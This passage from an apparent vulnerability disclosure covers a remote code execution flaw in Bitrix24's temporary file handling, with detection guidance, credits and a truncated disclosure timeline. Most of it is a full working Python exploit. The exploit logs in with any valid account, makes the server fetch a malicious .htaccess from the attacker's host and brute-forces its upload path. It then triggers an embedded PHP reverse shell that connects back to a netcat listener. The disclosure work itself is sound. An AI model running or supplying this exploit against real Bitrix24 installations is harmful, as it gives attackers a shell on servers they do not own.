<h2 id="proof-of-concept">Proof-of-Concept<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h2>
<p>We have tried our best to make the PoC as portable as possible. This report includes a functional exploit written in Python3 that exploits the insecure temporary file creation vulnerability and opens a reverse shell connection to the victim web server.</p>
<p>It is worth noting that a user without any permissions or access to any group can exploit this vulnerability.</p>
<p>A sample exploit script is shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Bitrix24 Insecure Tempory File creation RCE (CVE-2023-XXXXX)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Via: https://TARGET_HOST/bitrix/services/main/ajax.php?mode=class&amp;c=bitrix%3acrm.order.import.instagram.view&amp;action=importAjax</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Author: Lam Jun Rong (STAR Labs SG Pte. Ltd.)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">typing</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">itertools</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">http.server</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">HTTPServer</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">socketserver</span> <span class="kn">import</span> <span class="n">ThreadingMixIn</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:8000&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">SITE_ID</span> <span class="o">=</span> <span class="s2">&#34;s1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">USERNAME</span> <span class="o">=</span> <span class="s2">&#34;user&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">PASSWORD</span> <span class="o">=</span> <span class="s2">&#34;abcdef&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">LPORT1</span> <span class="o">=</span> <span class="mi">8001</span>
</span></span><span class="line"><span class="cl"><span class="n">LPORT2</span> <span class="o">=</span> <span class="mi">9001</span>
</span></span><span class="line"><span class="cl"><span class="n">LHOST</span> <span class="o">=</span> <span class="s2">&#34;192.168.86.43&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">DELAY_SECONDS</span> <span class="o">=</span> <span class="mi">60</span>
</span></span><span class="line"><span class="cl"><span class="n">N_REPS</span> <span class="o">=</span> <span class="mi">1000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PROXY</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">nested_to_urlencoded</span><span class="p">(</span><span class="n">val</span><span class="p">:</span> <span class="n">typing</span><span class="o">.</span><span class="n">Any</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">val</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">val</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="n">child</span> <span class="o">=</span> <span class="n">nested_to_urlencoded</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">]&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">child</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">                <span class="n">out</span><span class="p">[</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="nb">type</span><span class="p">(</span><span class="n">val</span><span class="p">)</span> <span class="ow">in</span> <span class="p">[</span><span class="nb">list</span><span class="p">,</span> <span class="nb">tuple</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">child</span> <span class="o">=</span> <span class="n">nested_to_urlencoded</span><span class="p">(</span><span class="n">item</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">]&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">child</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">                <span class="n">out</span><span class="p">[</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="p">[</span><span class="n">prefix</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_creds</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/bitrix/tools/public_session.php&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;X-Bitrix-Csrf-Token&#34;</span><span class="p">:</span> <span class="n">sessid</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;PHPSESSID&#34;</span><span class="p">:</span> <span class="n">cookie</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="n">proxies</span><span class="o">=</span><span class="n">PROXY</span><span class="p">)</span><span class="o">.</span><span class="n">text</span> <span class="o">==</span> <span class="s2">&#34;OK&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="s2">&#34;./cached-creds.txt&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">cookie</span><span class="p">,</span> <span class="n">sessid</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./cached-creds.txt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">check_creds</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Using cached credentials&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">sessid</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Cached credentials are invalid&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/?login=yes&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;AUTH_FORM&#34;</span><span class="p">:</span> <span class="s2">&#34;Y&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;TYPE&#34;</span><span class="p">:</span> <span class="s2">&#34;AUTH&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;backurl&#34;</span><span class="p">:</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;USER_LOGIN&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;USER_PASSWORD&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;BITRIX_SM_LOGIN&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[!] Invalid credentials&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">sessid</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&#34;&#39;bitrix_sessid&#39;:&#39;([a-f0-9]</span><span class="si">{32}</span><span class="s2">)&#39;&#34;</span><span class="p">),</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Logged in as </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./cached-creds.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">sessid</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">sessid</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">start_server</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">MyHandler</span><span class="p">(</span><span class="n">http</span><span class="o">.</span><span class="n">server</span><span class="o">.</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">htaccess</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./.htaccess&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">path</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># Request .htaccess</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;.htaccess&#34;</span> <span class="ow">in</span> <span class="n">path</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">htaccess</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># Delay</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Delaying return by&#34;</span><span class="p">,</span> <span class="n">DELAY_SECONDS</span><span class="p">,</span> <span class="s2">&#34;seconds&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># send the body of the response</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">DELAY_SECONDS</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;A</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># Shutdown server when done</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">server</span><span class="o">.</span><span class="n">shutdown</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">log_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="nb">format</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">:</span> <span class="n">typing</span><span class="o">.</span><span class="n">Any</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Silence logging</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">ThreadedHTTPServer</span><span class="p">(</span><span class="n">ThreadingMixIn</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;Handle requests in a separate thread.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">httpd</span> <span class="o">=</span> <span class="n">ThreadedHTTPServer</span><span class="p">((</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="n">LPORT1</span><span class="p">),</span> <span class="n">MyHandler</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">forever</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">httpd</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">httpd</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">forever</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Started HTTP server on&#34;</span><span class="p">,</span> <span class="n">LPORT1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">httpd</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">instagram_import</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">HOST</span>
</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="s2">&#34;/bitrix/services/main/ajax.php?mode=class&amp;c=bitrix</span><span class="si">%3a</span><span class="s2">crm.order.import.instagram.view&amp;action=importAjax&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="n">nested_to_urlencoded</span><span class="p">([{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;IMAGES&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">                          <span class="sa">f</span><span class="s2">&#34;http://</span><span class="si">{</span><span class="n">LHOST</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">LPORT1</span><span class="si">}</span><span class="s2">/.htaccess&#34;</span>
</span></span><span class="line"><span class="cl">                      <span class="p">]</span> <span class="o">*</span> <span class="n">N_REPS</span> <span class="o">+</span> <span class="p">[</span><span class="sa">f</span><span class="s2">&#34;http://</span><span class="si">{</span><span class="n">LHOST</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">LPORT1</span><span class="si">}</span><span class="s2">/delay&#34;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;NAME&#34;</span><span class="p">:</span> <span class="s2">&#34;Product 1&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}],</span> <span class="n">prefix</span><span class="o">=</span><span class="s2">&#34;items&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;X-Bitrix-Csrf-Token&#34;</span><span class="p">:</span> <span class="n">sessid</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Waiting done&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test_exists</span><span class="p">(</span><span class="n">dir_name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s2">/upload/tmp/</span><span class="si">{</span><span class="n">dir_name</span><span class="si">}</span><span class="s2">/.htaccess&#34;</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">PROXY</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bruteforce</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Bruteforcing .htaccess location&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">dir_name</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">chars</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">3</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">dir_name</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">dir_name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">test_exists</span><span class="p">(</span><span class="n">dir_name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Found .htaccess: </span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s2">/upload/tmp/</span><span class="si">{</span><span class="n">dir_name</span><span class="si">}</span><span class="s2">/.htaccess&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">dir_name</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reverse_shell</span><span class="p">(</span><span class="n">dir_name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s2">/upload/tmp/</span><span class="si">{</span><span class="n">dir_name</span><span class="si">}</span><span class="s2">/.htaccess?ip=</span><span class="si">{</span><span class="n">LHOST</span><span class="si">}</span><span class="s2">&amp;port=</span><span class="si">{</span><span class="n">LPORT2</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">PROXY</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="n">PROXY</span>
</span></span><span class="line"><span class="cl">    <span class="n">sessid</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">USERNAME</span><span class="p">,</span> <span class="n">PASSWORD</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">start_server</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">instagram_import</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">sessid</span><span class="p">))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">dir_name</span> <span class="o">=</span> <span class="n">bruteforce</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">reverse_shell</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">dir_name</span><span class="p">,))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Waiting for reverse shell connection&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s2">&#34;nc&#34;</span><span class="p">,</span> <span class="s2">&#34;-nvlp&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT2</span><span class="p">)])</span>
</span></span></code></pre></div><p><code>.htaccess</code> file:</p>
<pre tabindex="0"><code>&lt;Files ~ &#34;^\.ht&#34;&gt;
    Require all granted
    Order allow,deny
    Allow from all
    SetHandler application/x-httpd-php
&lt;/Files&gt;


# &lt;?php /* Sleep to allow nc listener to start */sleep(2);$sock=fsockopen($_GET[&#34;ip&#34;],intval($_GET[&#34;port&#34;]));$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes); ?&gt;
</code></pre><p>This file is required to be present in the same directory as the Python3 exploit code. When running the exploit code, it will spawn an HTTP server on <code>LPORT1</code> serving the malicious <code>.htaccess</code> file, and also start a netcat listener on <code>LPORT2</code> for the reverse shell.</p>
<h2 id="exploit-conditions">Exploit Conditions<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions">#</a></h2>
<p>This vulnerability can be exploited when the attacker has any valid set of credentials (regardless of privileges).</p>
<h2 id="detection-guidance">Detection Guidance<a hidden class="anchor" aria-hidden="true" href="#detection-guidance">#</a></h2>
<p>It is possible to detect the exploitation of this vulnerability by checking the server&rsquo;s access logs for all requests made to <code>/upload/tmp/xxx/.htaccess</code> where <code>xxx</code> is a 3 character alphanumeric string, or any request made to <code>/upload/tmp/</code> as this path is not supposed to be accessed over HTTP request. A large number of requests to such URLs is strongly indicative of exploitation of this vulnerability.</p>
<h2 id="credits">Credits<a hidden class="anchor" aria-hidden="true" href="#credits">#</a></h2>
<p>Lam Jun Rong &amp; Li Jiantao of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>
<h2 id="timeline">Timeline<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h2>
<ul>
<li>2023-03-17 Initial Vendor Contact via <a href="https://www.bitrix24.com/report/">https://www.bitrix24.com/report/</a></li>
<li>2023-03-18 No reply from vendor, tried using the form again</li>
